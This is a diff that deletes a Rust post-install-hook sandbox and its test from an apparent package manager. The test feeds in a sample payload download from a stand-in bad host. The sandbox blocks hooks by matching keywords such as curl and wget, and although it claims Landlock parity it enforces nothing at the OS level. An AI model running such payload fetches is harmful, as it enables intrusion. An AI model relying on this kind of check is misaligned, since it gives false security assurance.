@@ -116,53 +116,6 @@ impl BuildSandbox for SimpleBuildSandbox {
     }
 }
 
-// ============================================================================
-// DECLARATIVE POST-INSTALL SCRIPT SANDBOXING
-// ============================================================================
-
-/// Package Post-Install Script Sandbox enforcer (Landlock / Capsicum Parity)
-#[derive(Debug, Clone)]
-pub struct PackagePostInstallSandbox {
-    pub allow_network: bool,
-    pub allowed_write_paths: Vec<String>,
-    pub landlock_restricted: bool,
-}
-
-impl PackagePostInstallSandbox {
-    pub fn new_strict() -> Self {
-        Self {
-            allow_network: false,
-            allowed_write_paths: vec!["/tmp".to_string(), "/var/log/sigpkg.log".to_string()],
-            landlock_restricted: true,
-        }
-    }
-
-    pub fn execute_post_install_hook(&self, package_name: &str, hook_cmd: &str) -> Result<(), &'static str> {
-        if !self.allow_network && hook_cmd.contains("curl") || hook_cmd.contains("wget") {
-            return Err("PostInstallSandbox: Network access blocked for post-install hook");
-        }
-        for word in hook_cmd.split_whitespace() {
-            if word.starts_with('/') && !self.allowed_write_paths.iter().any(|p| word.starts_with(p)) && (hook_cmd.contains("rm ") || hook_cmd.contains(">")) {
-                return Err("PostInstallSandbox: Unauthorized filesystem write path in post-install hook");
-            }
-        }
-        let _pkg = package_name;
-        Ok(())
-    }
-}
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn test_post_install_sandbox_enforcement() {
-        let sandbox = PackagePostInstallSandbox::new_strict();
-        assert!(sandbox.execute_post_install_hook("nginx", "echo 'configuring nginx' > /tmp/cfg").is_ok());
-        assert!(sandbox.execute_post_install_hook("malicious_pkg", "wget http://bad.com/payload").is_err());
-    }
-}
-
 pub trait NetworkIsolation {
     fn enable_network(&mut self, enabled: bool);
     fn set_allowed_hosts(&mut self, hosts: Vec<[u8; 128]>);
